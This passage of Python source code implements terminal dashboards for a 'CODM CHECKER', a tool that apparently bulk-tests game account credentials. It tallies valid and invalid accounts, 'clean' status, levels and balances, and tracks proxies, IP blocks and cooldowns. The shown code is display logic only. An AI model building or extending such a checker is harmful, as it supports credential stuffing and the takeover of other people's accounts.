                bar.append("█", style=f"bold {color}")
            else:
                bar.append("█", style=color)

        if full < width and rem > 0:
            if glow:
                bar.append(self._SUB_BLOCKS[rem], style=f"bold {color}")
            else:
                bar.append(self._SUB_BLOCKS[rem], style=color)
            empty_count = width - full - 1
        else:
            empty_count = width - full

        bar.append("░" * empty_count, style=self._C_FAINT)

        if show_pct:
            pct = ratio * 100
            pct_color = self._severity_color(pct)
            bar.append(f"  [ {pct:5.1f}% ]", style=f"bold {pct_color}")

        return bar

    def _gradient_bar(self, count, denom, color1, color2, width=20, show_pct=False):
        if denom == 0:
            bar = Text("░" * width, style=self._C_FAINT)
            if show_pct:
                bar.append("  [ 0.0% ]", style=self._C_FAINT)
            return bar

        ratio = min(count / denom, 1.0)
        total_sub = width * 8
        filled = int(ratio * total_sub)

        bar = Text()
        for i in range(width):
            sub_filled = max(0, min(8, filled - i * 8))
            if sub_filled == 0:
                bar.append("░", style=self._C_FAINT)
            else:
                t = i / max(width - 1, 1)
                c = color1 if t < 0.5 else color2
                if sub_filled == 8:
                    bar.append("█", style=c)
                else:
                    bar.append(self._SUB_BLOCKS[sub_filled], style=c)

        if show_pct:
            pct = ratio * 100
            pct_color = self._severity_color(pct)
            bar.append(f"  [ {pct:5.1f}% ]", style=f"bold {pct_color}")

        return bar

    def _severity_color(self, pct):
        if pct >= 75:
            return self._C_SUCCESS
        elif pct >= 50:
            return self._C_WARNING
        elif pct >= 25:
            return self._C_PRIMARY
        elif pct > 0:
            return self._C_ERROR
        return self._C_FAINT

    def _elegant_pct(self, count, denom):
        if denom == 0:
            return Text("[ 0.0% ]", style=self._C_FAINT)
        pct = count / denom * 100
        c = self._severity_color(pct)
        return Text(f"[ {pct:5.1f}% ]", style=f"bold {c}")

    def _mini_bar(self, count, denom, color, width=14):
        if denom == 0:
            return Text("░" * width, style=self._C_FAINT)
        ratio = min(count / denom, 1.0)
        total_sub = width * 8
        filled = int(ratio * total_sub)
        full = filled // 8
        rem = filled % 8

        bar = Text()
        bar.append("█" * full, style=color)
        if full < width and rem > 0:
            bar.append(self._SUB_BLOCKS[rem], style=color)
            bar.append("░" * (width - full - 1), style=self._C_FAINT)
        else:
            bar.append("░" * (width - full), style=self._C_FAINT)
        return bar

    def _section_title(self, icon, title, color=None):
        c = color or self._C_PRIMARY
        return Text.assemble(
            (f" {icon}  ", f"bold {c}"),
            (title, f"bold {c}"),
        )

    def _divider(self, width=44):
        return Text("╶" + "─" * (width - 2) + "╴", style=self._C_FAINT)

    def _health_label(self, rate):
        if rate >= 70:
            return Text.assemble(("● ", self._C_SUCCESS), ("HEALTHY", f"bold {self._C_SUCCESS}"))
        elif rate >= 40:
            return Text.assemble(("● ", self._C_WARNING), ("MODERATE", f"bold {self._C_WARNING}"))
        elif rate > 0:
            return Text.assemble(("● ", self._C_ERROR), ("LOW", f"bold {self._C_ERROR}"))
        return Text.assemble(("● ", self._C_FAINT), ("—", self._C_FAINT))

    # ═══════════════════════════════════════════════════════════════
    #  LIVE STATS PANEL
    # ═══════════════════════════════════════════════════════════════

    def display_stats(self):
        stats = self.get_stats()
        processed = self.get_processed_count()

        if processed == 0:
            empty_text = Text.assemble(
                ("\n\n  ✦  ◌  ", self._C_FAINT),
                ("Waiting for data…", self._C_MUTED),
                ("  ◌  ✦\n\n", self._C_FAINT),
            )
            return Panel(
                Align.center(empty_text, vertical="middle"),
                title=self._section_title('✦', 'LIVE STATISTICS', self._C_PRIMARY),
                border_style=self._C_PRIMARY,
                box=DOUBLE,
                padding=(1, 2),
            )

        elapsed = time.time() - self.start_time
        rate = processed / elapsed if elapsed > 0 else 0
        remaining = self.total_accounts - processed
        eta = remaining / rate if rate > 0 else 0
        pct = processed / self.total_accounts * 100 if self.total_accounts > 0 else 0

        tbl = Table(show_header=False, box=None, padding=(0, 1), expand=False)
        tbl.add_column(style=self._C_MUTED, min_width=6, no_wrap=True)
        tbl.add_column(style=self._C_TEXT, min_width=10, no_wrap=True, justify='right')
        tbl.add_column(min_width=18, no_wrap=True)
        tbl.add_column(min_width=12, no_wrap=True)

        prog_bar = self._gradient_bar(
            processed, self.total_accounts,
            self._C_PRIMARY, self._C_VIOLET,
            width=32, show_pct=False
        )
        pct_text = self._elegant_pct(processed, self.total_accounts)
        meta_text = Text(
            f"{processed}/{self.total_accounts}  ·  {rate:.1f}/s  ·  ETA {int(eta // 60)}m{int(eta % 60)}s",
            style=self._C_MUTED
        )
        tbl.add_row(prog_bar, pct_text, meta_text, Text(""))
        tbl.add_row(self._divider(50), Text(""), Text(""), Text(""))

        total_c = stats['valid'] + stats['invalid']
        rows = [
            ('✔', 'Valid',     stats['valid'],     self._C_SUCCESS, total_c),
            ('✖', 'Invalid',   stats['invalid'],   self._C_ERROR,   total_c),
            ('✨', 'Clean',     stats['clean'],     self._C_SUCCESS, max(stats['valid'], 1)),
            ('⊘', 'Not Clean', stats['not_clean'], self._C_WARNING, max(stats['valid'], 1)),
            ('◈', 'CODM',      stats['has_codm'],  self._C_PRIMARY, max(stats['valid'], 1)),
            ('○', 'No CODM',   stats['no_codm'],   self._C_MUTED,   max(stats['valid'], 1)),
        ]
        for icon, label, count, color, denom in rows:
            tbl.add_row(
                Text.assemble((f"  {icon}  ", color), (label, self._C_MUTED)),
                Text(f"{count:,}", style=f"bold {color}"),
                self._mini_bar(count, denom, color, 14),
                self._elegant_pct(count, denom),
            )

        tbl.add_row(self._divider(50), Text(""), Text(""), Text(""))

        tbl.add_row(
            Text.assemble(("  ▲  ", self._C_SUCCESS), ("Top Clean Lv", self._C_MUTED)),
            Text(f"{stats['highest_clean_level']}", style=f"bold {self._C_SUCCESS}"),
            Text("◆ Peak Performance", style=self._C_FAINT),
            Text(""),
        )
        tbl.add_row(
            Text.assemble(("  ▲  ", self._C_WARNING), ("Top NC Lv", self._C_MUTED)),
            Text(f"{self.highest_not_clean_level}", style=f"bold {self._C_WARNING}"),
            Text(""),
            Text(""),
        )
        hs = stats.get('highest_shell', 0)
        hs_color = self._C_GOLD if hs > 0 else self._C_MUTED
        hs_icon = '💎' if hs > 0 else '◆'
        tbl.add_row(
            Text.assemble((f"  {hs_icon}  ", hs_color), ("Shell Peak", self._C_MUTED)),
            Text(f"{hs:,}", style=f"bold {hs_color}"),
            Text(""),
            Text(""),
        )

        gc = stats.get('game_counts', {})
        active_games = [(label, gc.get(key, 0)) for key, label in GAME_DISPLAY_NAMES if gc.get(key, 0) > 0]
        if active_games:
            tbl.add_row(self._divider(50), Text(""), Text(""), Text(""))
            for label, count in active_games:
                tbl.add_row(
                    Text.assemble(("  🎮  ", self._C_INFO), (label, self._C_MUTED)),
                    Text(f"{count:,}", style=f"bold {self._C_INFO}"),
                    self._mini_bar(count, max(stats['valid'], 1), self._C_INFO, 14),
                    Text(""),
                )

        return Panel(
            tbl,
            title=self._section_title('✦', 'LIVE STATISTICS', self._C_PRIMARY),
            border_style=self._C_PRIMARY,
            box=DOUBLE,
            padding=(0, 2),
            subtitle=Text.assemble(
                ("⚡ ", self._C_WARNING),
                (f"{rate:.1f}/s", f"bold {self._C_WARNING}"),
                ("  ·  ", self._C_FAINT),
                ("ETA ", self._C_MUTED),
                (f"{int(eta // 60)}m{int(eta % 60)}s", self._C_TEXT),
            ),
        )

    # ═══════════════════════════════════════════════════════════════
    #  FINAL SUMMARY — Premium Multi-Panel Layout
    # ═══════════════════════════════════════════════════════════════

    def display_final_stats(self):
        stats = self.get_stats()
        elapsed = time.time() - self.start_time
        total = self.total_accounts
        proc = self.get_processed_count()
        rate = proc / elapsed if elapsed > 0 else 0
        console = Console()

        console.print()
        console.print(Rule(
            Text.assemble(
                (" ✦  ", self._C_VIOLET),
                ("SESSION COMPLETE", f"bold {self._C_PRIMARY}"),
                ("  ✦ ", self._C_VIOLET),
            ),
            style=self._C_PRIMARY,
            characters="═",
        ))
        console.print()

        results_table = Table(
            show_header=True,
            header_style=f"bold {self._C_MUTED}",
            box=ROUNDED,
            border_style=self._C_PRIMARY,
            padding=(0, 2),
            expand=False,
        )
        results_table.add_column("Category", style=self._C_MUTED, no_wrap=True, width=18)
        results_table.add_column("Count", justify="right", style=self._C_TEXT, width=12)
        results_table.add_column("Pct", justify="right", width=12)
        results_table.add_column("Distribution", no_wrap=True, width=28)

        denom = max(total, 1)
        for label, count, color, icon in [
            ("Valid",   stats['valid'],   self._C_SUCCESS, '✔'),
            ("Invalid", stats['invalid'], self._C_ERROR,   '✖'),
            ("Errors",  stats['error'],   self._C_MUTED,   '·'),
        ]:
            results_table.add_row(
                Text.assemble((f"  {icon}  ", color), (label, color)),
                Text(f"{count:,}", style=color),
                self._elegant_pct(count, denom),
                self._gradient_bar(count, denom, color, self._C_INFO, 22),
            )

        results_table.add_row(Text(""), Text(""), Text(""), Text(""))

        vd = max(stats['valid'], 1)
        for label, count, color, icon in [
            ("Clean",     stats['clean'],     self._C_SUCCESS, '✨'),
            ("Not Clean", stats['not_clean'], self._C_WARNING, '⊘'),
            ("Has CODM",  stats['has_codm'],  self._C_PRIMARY, '◈'),
            ("No CODM",   stats['no_codm'],   self._C_MUTED,   '○'),
        ]:
            results_table.add_row(
                Text.assemble((f"  {icon}  ", color), (label, color)),
                Text(f"{count:,}", style=color),
                self._elegant_pct(count, vd),
                self._gradient_bar(count, vd, color, self._C_INFO, 22),
            )

        console.print(Panel(
            results_table,
            title=self._section_title('✦', 'SESSION RESULTS', self._C_PRIMARY),
            border_style=self._C_PRIMARY,
            box=DOUBLE,
            padding=(0, 1),
        ))

        stats_table = Table(
            show_header=False,
            box=ROUNDED,
            border_style=self._C_WARNING,
            padding=(0, 2),
            expand=False,
        )
        stats_table.add_column(style=self._C_MUTED, width=18, no_wrap=True)
        stats_table.add_column(style=self._C_TEXT, no_wrap=True)

        hs = stats.get('highest_shell', 0)
        hs_style = f"bold {self._C_GOLD}" if hs > 0 else self._C_MUTED
        cl_style = f"bold {self._C_SUCCESS}" if stats['highest_clean_level'] > 0 else self._C_MUTED
        nc_style = f"bold {self._C_WARNING}" if self.highest_not_clean_level > 0 else self._C_MUTED

        valid_rate = stats['valid'] / max(proc, 1) * 100 if proc > 0 else 0
        health = self._health_label(valid_rate)

        metrics = [
            ("⏱  Elapsed",      f"{int(elapsed // 60)}m {int(elapsed % 60)}s"),
            ("⚡  Rate",          f"{rate:.2f} acc/s"),
            ("◈  Processed",     f"{proc:,} / {total:,}"),
            ("💚  Health",       health),
            ("",                 Text("")),
            ("▲  Peak Clean Lv", Text(f"{stats['highest_clean_level']}", style=cl_style)),
            ("▲  Peak NC Lv",    Text(f"{self.highest_not_clean_level}", style=nc_style)),
            ("💎  Peak Shell",   Text(f"{hs:,}" if hs > 0 else "N/A", style=hs_style)),
        ]
        for label, val in metrics:
            stats_table.add_row(Text(label, style=self._C_MUTED), val)

        level_table = Table(
            show_header=True,
            header_style=f"bold {self._C_MUTED}",
            box=ROUNDED,
            border_style=self._C_INFO,
            padding=(0, 1),
            expand=False,
        )
        level_table.add_column("Range", style=self._C_MUTED, no_wrap=True, width=12)
        level_table.add_column("Clean", justify="right", style=self._C_SUCCESS, width=7)
        level_table.add_column("Bar", no_wrap=True, width=14)
        level_table.add_column("NC", justify="right", style=self._C_WARNING, width=7)
        level_table.add_column("Bar", no_wrap=True, width=14)

        clean_lvl = stats['clean_level_counts']
        not_clean_lvl = stats['not_clean_level_counts']
        ct = max(stats['clean'], 1)
        nt = max(stats['not_clean'], 1)

        for rng in ['350+', '201-349', '101-200', '1-100']:
            cc = clean_lvl.get(rng, 0)
            nc = not_clean_lvl.get(rng, 0)
            level_table.add_row(
                Text(f"  Lv {rng}", style=self._C_MUTED),
                Text(f"{cc:,}", style=self._C_SUCCESS),
                self._mini_bar(cc, ct, self._C_SUCCESS, 12),
                Text(f"{nc:,}", style=self._C_WARNING),
                self._mini_bar(nc, nt, self._C_WARNING, 12),
            )

        metrics_panel = Panel(
            stats_table,
            title=self._section_title('✦', 'METRICS', self._C_WARNING),
            border_style=self._C_WARNING,
            box=ROUNDED,
            padding=(0, 1),
        )
        levels_panel = Panel(
            level_table,
            title=self._section_title('✦', 'LEVEL DISTRIBUTION', self._C_INFO),
            border_style=self._C_INFO,
            box=ROUNDED,
            padding=(0, 1),
        )

        console.print()
        console.print(Columns([metrics_panel, levels_panel], expand=False, equal=False, padding=(0, 2)))

        gc = stats.get('game_counts', {})
        active_games = [(label, gc.get(key, 0)) for key, label in GAME_DISPLAY_NAMES if gc.get(key, 0) > 0]

        if active_games:
            games_table = Table(
                show_header=True,
                header_style=f"bold {self._C_MUTED}",
                box=ROUNDED,
                border_style=self._C_PRIMARY,
                padding=(0, 2),
                expand=False,
            )
            games_table.add_column("Game", style=self._C_MUTED, no_wrap=True, width=24)
            games_table.add_column("Accounts", justify="right", style=self._C_TEXT, width=10)
            games_table.add_column("Pct", justify="right", width=10)
            games_table.add_column("Distribution", no_wrap=True, width=24)

            peak = max(c for _, c in active_games) or 1
            for label, count in active_games:
                games_table.add_row(
                    Text(f"  🎮  {label}", style=self._C_MUTED),
                    Text(f"{count:,}", style=self._C_PRIMARY),
                    self._elegant_pct(count, peak),
                    self._gradient_bar(count, peak, self._C_PRIMARY, self._C_VIOLET, 20),
                )
            console.print()
            console.print(Panel(
                games_table,
                title=self._section_title('✦', 'GAME CONNECTIONS', self._C_PRIMARY),
                border_style=self._C_PRIMARY,
                box=DOUBLE,
                padding=(0, 1),
            ))

        console.print()
        console.print(Rule(style=self._C_FAINT, characters="─"))

        footer = Text.assemble(
            ("  ❖  ", f"bold {self._C_GOLD}"),
            ("Powered by ", self._C_MUTED),
            ("@LEGITCosmicDev x @LEGITCosmicDev2nd", f"bold {self._C_INFO}"),
            ("  ❖  ", f"bold {self._C_GOLD}"),
            (f"·  {proc:,} processed in {int(elapsed // 60)}m{int(elapsed % 60)}s", self._C_FAINT),
        )
        console.print(Align.center(footer))
        console.print()


class BulkLiveDashboard:
    """
    ═══════════════════════════════════════════════════════════════
    ✦  Single-Column Streamlined Dashboard — Narrow Terminal Design ✦
    ═══════════════════════════════════════════════════════════════
    """

    MAX_RECENT = 100

    # ── Premium Design Tokens ────────────────────────────────────
    _C_PRIMARY = 'bright_cyan'
    _C_SUCCESS = 'bright_green'
    _C_WARNING = 'bright_yellow'
    _C_ERROR   = 'bright_red'
    _C_INFO    = 'bright_magenta'
    _C_GOLD    = 'gold1'
    _C_VIOLET  = 'violet'
    _C_MUTED   = 'grey50'
    _C_FAINT   = 'grey30'
    _C_TEXT    = 'bright_white'
    _C_BORDER  = 'grey35'

    _SUB_BLOCKS = ['', '▏', '▎', '▍', '▌', '▋', '▊', '▉']

    def __init__(self, total_accounts: int, max_threads: int = 1):
        self.total = total_accounts
        self.done = self.valid = self.invalid = 0
        self.clean = self.not_clean = 0
        self.codm_present = self.no_codm = 0
        self.lvl_1_100 = self.lvl_101_200 = self.lvl_201_300 = self.lvl_350_400 = 0
        self.highest_shell_balance = 0
        self.highest_clean_level = 0
        self.highest_not_clean_level = 0
        self.start_time = time.time()
        self.ip_blocked = False
        self.cooldown_until = 0.0
        self.active_threads = self.max_threads = max_threads
        self.ramp_mode = False
        self.proxy_count = 0
        self.scan_mode = 'Bulk Scan'
        self.retries = 0
        self.errors = 0
        self.rate_limits = 0
        self.high_hits = deque(maxlen=10)
        self.recent = deque(maxlen=self.MAX_RECENT)
        self.current_proxy = None
        self.current_proxy_line = None
        self._lock = Lock()
        self._spinner_frames = '⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
        self._tick = 0
        self._dirty = True
        self._live = None
        self._stop_event = Event()
        self._render_thread = None

    # ── Public API ───────────────────────────────────────────────
    def set_current_proxy(self, proxy: str = None, line: int = None):
        with self._lock:
            if proxy:
                self.current_proxy = proxy
            if line is not None:
                self.current_proxy_line = line
            self._dirty = True

    def set_proxy_count(self, count: int):
        with self._lock:
            self.proxy_count = count
            self._dirty = True

    def set_scan_mode(self, mode: str):
        with self._lock:
            self.scan_mode = mode
            self._dirty = True

    def record(self, index: int, account: str, success: bool, is_clean: bool = False,
               has_codm: bool = False, codm_level: int = 0, shell_balance: int = 0,
               error_reason: str = ''):
        with self._lock:
            self.done += 1
            n = self.done
            if success:
                self.valid += 1
                if is_clean:
                    self.clean += 1
                else:
                    self.not_clean += 1
                    if codm_level > self.highest_not_clean_level:
                        self.highest_not_clean_level = codm_level
                if shell_balance > self.highest_shell_balance:
                    self.highest_shell_balance = shell_balance
                if is_clean and codm_level > self.highest_clean_level:
                    self.highest_clean_level = codm_level
                if has_codm:
                    self.codm_present += 1
                    if codm_level <= 100:
                        self.lvl_1_100 += 1
                    elif codm_level <= 200:
                        self.lvl_101_200 += 1
                    elif codm_level <= 349:
                        self.lvl_201_300 += 1
                    else:
                        self.lvl_350_400 += 1
                    if codm_level >= 100:
                        self.high_hits.appendleft((codm_level, account, is_clean))

                    if is_clean:
                        tag = f'[{self._C_SUCCESS}]✨ CLEAN[/{self._C_SUCCESS}]'
                    else:
                        tag = f'[{self._C_WARNING}]⊘ NOT CLEAN[/{self._C_WARNING}]'

                    shell_str = f'  [{self._C_GOLD}]💎 {shell_balance:,}[/{self._C_GOLD}]' if shell_balance > 0 else ''
                    detail = f'  [{self._C_MUTED}]Lv {codm_level}[/{self._C_MUTED}]{shell_str}' if codm_level else ''
                    line = f'[{self._C_MUTED}]{n:>4}[/{self._C_MUTED}]  [{self._C_SUCCESS}]✓[/{self._C_SUCCESS}]  [{self._C_PRIMARY}]{account}[/{self._C_PRIMARY}]  {tag}{detail}'
                else:
                    self.no_codm += 1
                    subtag = f'[{self._C_MUTED}](clean)[/{self._C_MUTED}]' if is_clean else f'[{self._C_MUTED}](nc)[/{self._C_MUTED}]'
                    tag = f'[{self._C_INFO}]○ NO CODM[/{self._C_INFO}] {subtag}'
                    line = f'[{self._C_MUTED}]{n:>4}[/{self._C_MUTED}]  [{self._C_SUCCESS}]✓[/{self._C_SUCCESS}]  [{self._C_PRIMARY}]{account}[/{self._C_PRIMARY}]  {tag}'
            else:
                self.invalid += 1
                reason = error_reason or 'Invalid'
                line = f'[{self._C_MUTED}]{n:>4}[/{self._C_MUTED}]  [{self._C_ERROR}]✗[/{self._C_ERROR}]  [{self._C_MUTED}]{account}[/{self._C_MUTED}]  [{self._C_ERROR}]{reason}[/{self._C_ERROR}]'
            self.recent.append(line)
            self._dirty = True

    def set_ip_blocked(self, blocked: bool):
        with self._lock:
            self.ip_blocked = blocked
            self._dirty = True

    def set_cooldown(self, seconds: float):
        with self._lock:
            self.cooldown_until = time.time() + seconds if seconds > 0 else 0.0
            self._dirty = True

    def set_active_threads(self, n: int, ramp_mode: bool = False):
        with self._lock:
            self.active_threads = n
            self.ramp_mode = ramp_mode
            self._dirty = True

    # ── Visual helpers ───────────────────────────────────────────

    def _severity_color(self, pct):
        if pct >= 75:
            return self._C_SUCCESS
        elif pct >= 50:
            return self._C_WARNING
        elif pct >= 25:
            return self._C_PRIMARY
        elif pct > 0:
            return self._C_ERROR
        return self._C_FAINT

    def _format_elapsed(self, seconds):
        """Format elapsed seconds as HH:MM:SS for header display."""
        secs = int(seconds)
        h = secs // 3600
        m = (secs % 3600) // 60
        s = secs % 60
        return f"{h:02d}:{m:02d}:{s:02d}"

    def _mini_bar(self, count, denom, color, width=12):
        if denom == 0:
            return Text("░" * width, style=self._C_FAINT)
        ratio = min(count / denom, 1.0)
        total_sub = width * 8
        filled = int(ratio * total_sub)
        full = filled // 8
        rem = filled % 8
        bar = Text()
        bar.append("█" * full, style=color)
        if full < width and rem > 0:
            bar.append(self._SUB_BLOCKS[rem], style=color)
            bar.append("░" * (width - full - 1), style=self._C_FAINT)
        else:
            bar.append("░" * (width - full), style=self._C_FAINT)
        return bar

    def _elegant_pct(self, count, denom):
        if denom == 0:
            return Text("(0.0%)", style=self._C_FAINT)
        pct = count / denom * 100
        c = self._severity_color(pct)
        return Text(f"({pct:4.1f}%)", style=f"bold {c}")

    def _full_bar(self, count, denom, color1, color2, width=50):
        if denom == 0:
            return Text("░" * width, style=self._C_FAINT)
        ratio = min(count / denom, 1.0)
        total_sub = width * 8
        filled = int(ratio * total_sub)
        bar = Text()
        for i in range(width):
            sub_filled = max(0, min(8, filled - i * 8))
            if sub_filled == 0:
                bar.append("░", style=self._C_FAINT)
            else:
                t = i / max(width - 1, 1)
                c = color1 if t < 0.5 else color2
                if sub_filled == 8:
                    bar.append("█", style=c)
                else:
                    bar.append(self._SUB_BLOCKS[sub_filled], style=c)
        return bar

    # ── Render methods ───────────────────────────────────────────

    def _render_header(self, d):
        lines = []

        line1 = Text.assemble(
            ("│ ❖ ", self._C_GOLD),
            ("CODM CHECKER v3.0", f"bold {self._C_PRIMARY}"),
            ("  ✦  ", self._C_FAINT),
            ("@LEGITCosmicDev x @LEGITCosmicDev2nd", f"bold {self._C_INFO}"),
        )
        lines.append(line1)

        status_icon = "⦿"
        status_text = "ACTIVE"
        status_color = self._C_SUCCESS
        if d['ip_blocked']:
            status_text = "IP BLOCKED"
            status_color = self._C_ERROR
        elif d['cooldown_left'] > 0:
            status_text = f"COOLDOWN {d['cooldown_left']:.0f}s"
            status_color = self._C_WARNING

        line2 = Text.assemble(
            ("│ ⚡ ", self._C_WARNING),
            (f"{d['rate']:.1f}/s", f"bold {self._C_WARNING}"),
            ("  ·  ", self._C_FAINT),
            (f"{d['done']}/{d['total']}", self._C_TEXT),
            ("  ·  ", self._C_FAINT),
            ("⏱ ", self._C_MUTED),
            (d['elapsed_str'], self._C_TEXT),
            ("  ·  ", self._C_FAINT),
            (f"{status_icon} ", status_color),
            (status_text, f"bold {status_color}"),
        )
        lines.append(line2)

        return Group(*lines)

    def _render_progress(self, d):
        bar_width = max(40, min(56, _tw() - 20))
        bar = self._full_bar(d['done'], d['total'], d['prog_color'], d['prog_color2'], width=bar_width)

        progress_line = Text.assemble(
            ("PROGRESS: ", self._C_MUTED),
            (f"[ {d['pct']:.1f}% ]", f"bold {self._severity_color(d['pct'])}"),
            (f"  {d['done']}/{d['total']}", self._C_TEXT),
            (f"          ETA: {d['eta_str']}", self._C_MUTED),
        )
        bar_line = Text("")
        bar_line.append_text(bar)

        return Group(progress_line, bar_line)

    def _render_statistics_system(self, d):
        stat_lines = []
        vd = max(d['valid'], 1)
        for icon, label, val, color in [
            ('✔', 'Valid',     d['valid'],     self._C_SUCCESS),
            ('✖', 'Invalid',   d['invalid'],   self._C_ERROR),
            ('✨', 'Clean',     d['clean'],     self._C_SUCCESS),
            ('⊘', 'Not Clean', d['not_clean'], self._C_WARNING),
            ('◈', 'CODM',      d['codm_p'],    self._C_PRIMARY),
        ]:
            stat_lines.append(
                Text.assemble(
                    (f" {icon} ", color),
                    (f"{label:<11}", self._C_MUTED),
                    (f"{val:>5}", f"bold {color}"),
                    ("  ", self._C_FAINT),
                    self._elegant_pct(val, max(d['done'], 1)),
                )
            )

        stat_content = Group(*stat_lines)
        stat_panel = Panel(
            stat_content,
            title=f"[{self._C_MUTED}] ✦ STATISTICS [/{self._C_MUTED}]",
            border_style=self._C_BORDER,
            box=ROUNDED,
            padding=(0, 1),
            expand=True,
        )

        proxy_display = d['proxy_display']
        if d['proxy_line_num'] is not None:
            proxy_short = f"#{d['proxy_line_num']}"
        else:
            proxy_short = proxy_display[:20] if proxy_display else 'Direct'

        if d['ip_blocked']:
            if d['cooldown_left'] > 0:
                ip_status = f"⚠ IP BLOCKED {d['cooldown_left']:.0f}s"
                ip_color = self._C_ERROR
            else:
                ip_status = "⚠ IP BLOCKED"
                ip_color = self._C_ERROR
        else:
            ip_status = "NO IP BLOCK"
            ip_color = self._C_SUCCESS

        thread_color = self._C_SUCCESS if d['active'] == d['max_thr'] else self._C_WARNING
        ramp_str = " ⚡ramping" if d['ramp_mode'] else ""

        sys_lines = [
            Text.assemble(
                (" 🔗 ", self._C_MUTED),
                ("Proxy: ", self._C_MUTED),
                (f"{d['proxy_count']}", f"bold {self._C_PRIMARY}"),
            ),
            Text.assemble(
                (" ● ", ip_color),
                (f"Status: {ip_status}", f"bold {ip_color}"),
            ),
            Text.assemble(
                (" ⚙ ", thread_color),
                (f"Threads: {d['active']}/{d['max_thr']}", f"bold {thread_color}"),
                (ramp_str, self._C_WARNING),
            ),
            Text.assemble(
                (" ⌬ ", self._C_MUTED),
                ("Mode: ", self._C_MUTED),
                (d['scan_mode'], f"bold {self._C_PRIMARY}"),
            ),
        ]

        sys_content = Group(*sys_lines)
        sys_panel = Panel(
            sys_content,
            title=f"[{self._C_MUTED}] ⬡ SYSTEM [/{self._C_MUTED}]",
            border_style=self._C_BORDER,
            box=ROUNDED,
            padding=(0, 1),
            expand=True,
        )

        two_col = Table(show_header=False, box=None, padding=(0, 1), expand=True, show_edge=False)
        two_col.add_column(ratio=1)
        two_col.add_column(ratio=1)
        two_col.add_row(stat_panel, sys_panel)

        return two_col

    def _render_levels(self, d):
        lt = max(d['codm_p'], 1)
        lines = []

        for label, val, color in [
            ('Lv 1-100',     d['l1'], self._C_TEXT),
            ('Lv 101-200',   d['l2'], self._C_PRIMARY),
            ('Lv 201-349',   d['l3'], f"bold {self._C_PRIMARY}"),
            ('Lv 350+',      d['l4'], f"bold {self._C_WARNING}"),
        ]:
            lines.append(
                Text.assemble(
                    (" ◇ ", self._C_MUTED),
                    (f"{label:<13}", self._C_MUTED),
                    (f"{val:>5}", color),
                    ("  ", self._C_FAINT),
                    self._elegant_pct(val, lt),
                )
            )

        hs = d['hs']
        hs_str = f"{hs:,}" if hs > 0 else "N/A"
        hs_color = self._C_GOLD if hs > 0 else self._C_MUTED

        hc = d.get('hc', 0)
        hc_str = f"Lv {hc}" if hc > 0 else "N/A"
        hc_col = self._C_SUCCESS if hc > 0 else self._C_MUTED

        nc_peak = d.get('nc_peak', 0)
        nc_str = f"Lv {nc_peak}" if nc_peak > 0 else "N/A"
        nc_col = self._C_WARNING if nc_peak > 0 else self._C_MUTED

        lines.append(Text(""))
        lines.append(
            Text.assemble(
                (" 💎 ", hs_color),
                ("Peak Shell: ", self._C_MUTED),
                (f"{hs_str:<8}", f"bold {hs_color}"),
            )
        )
        lines.append(
            Text.assemble(
                (" ✨ ", hc_col),
                ("Peak Clean: ", self._C_MUTED),
                (hc_str, f"bold {hc_col}"),
            )
        )
        lines.append(
            Text.assemble(
                (" ⊘ ", nc_col),
                ("Peak Not Clean: ", self._C_MUTED),
                (nc_str, f"bold {nc_col}"),
            )
        )

        content = Group(*lines)
        return Panel(
            content,
            title=f"[{self._C_MUTED}] ◆ LEVELS & PEAKS [/{self._C_MUTED}]",
            border_style=self._C_BORDER,
            box=ROUNDED,
            padding=(0, 1),
            expand=True,
        )

    def _render_top_hits(self, d):
        lines = []
        if d['high_hits']:
            for lvl, acc, is_clean in d['high_hits'][:5]:
                hit_color = self._C_SUCCESS if is_clean else self._C_WARNING
                tag = '✨ CLEAN' if is_clean else '⊘ NOT CLEAN'
                acc_display = acc if len(acc) <= 36 else acc[:34] + '…'
                lines.append(
                    Text.assemble(
                        (f" {lvl:>3}  ", f"bold {hit_color}"),
                        (f"{acc_display:<38}", self._C_TEXT),
                        (tag, hit_color),
                    )
                )
        else:
            lines.append(Text("  ─  Waiting for high-level hits (Lv 100+)…", style=self._C_FAINT))

        content = Group(*lines)
        return Panel(
            content,
            title=f"[{self._C_MUTED}] ▲ TOP HITS (Lv 100+) [/{self._C_MUTED}]",
            border_style=self._C_WARNING,
            box=ROUNDED,
            padding=(0, 1),
            expand=True,
        )

    def _render_live_feed(self, d):
        lines = []
        log_lines = list(d['recent'])[-8:] if d['recent'] else []
        if log_lines:
            for line in log_lines:
                try:
                    lines.append(Text.from_markup(line))
                except Exception:
                    lines.append(Text(line))
        else:
            lines.append(Text("  ✦  ◌  Waiting for results…  ◌  ✦", style=self._C_FAINT))

        content = Group(*lines)
        return Panel(
            content,
            title=f"[{self._C_MUTED}] ✦ LIVE FEED [/{self._C_MUTED}]",
            border_style=self._C_INFO,
            box=ROUNDED,
            padding=(0, 1),
            expand=True,
        )

    def _render_footer(self, d):
        return Text.assemble(
            (" ❖ ", f"bold {self._C_GOLD}"),
            ("@LEGITCosmicDev x @LEGITCosmicDev2nd", f"bold {self._C_INFO}"),
            ("  ·  ", self._C_FAINT),
            (f"{d['rate']:.1f}/s", f"bold {self._C_WARNING}"),
            ("  ·  ", self._C_FAINT),
            ("ETA ", self._C_MUTED),
            (d['eta_str'], self._C_TEXT),
            ("  ·  ", self._C_FAINT),
            (f"{d['pct']:.1f}% Complete", f"bold {self._severity_color(d['pct'])}"),
        )

    # ── Main render ──────────────────────────────────────────────
    def _render(self) -> Group:
        with self._lock:
            done, total = self.done, self.total
            valid, invalid = self.valid, self.invalid
            clean, not_clean = self.clean, self.not_clean
            codm_p, no_codm = self.codm_present, self.no_codm
            ip_blocked = self.ip_blocked
            cooldown_left = max(0.0, self.cooldown_until - time.time())
            active, max_thr = self.active_threads, self.max_threads
            l1, l2, l3, l4 = self.lvl_1_100, self.lvl_101_200, self.lvl_201_300, self.lvl_350_400
            hs, hc = self.highest_shell_balance, self.highest_clean_level
            nc_peak = self.highest_not_clean_level
            high_hits = list(self.high_hits)
            recent = list(self.recent)
            elapsed = time.time() - self.start_time
            self._tick = (self._tick + 1) % len(self._spinner_frames)
            proxy_display = self.current_proxy or 'Direct connection'
            proxy_line_num = self.current_proxy_line
            ramp_mode = self.ramp_mode
            proxy_count = self.proxy_count
            scan_mode = self.scan_mode

        pct = done / total * 100 if total else 0
        rate = done / elapsed if elapsed > 0 else 0
        remaining = total - done
        eta_secs = remaining / rate if rate > 0 else 0
        eta_str = f'{int(eta_secs // 60)}m {int(eta_secs % 60):02d}s'

        border_main = self._C_ERROR if ip_blocked else self._C_PRIMARY
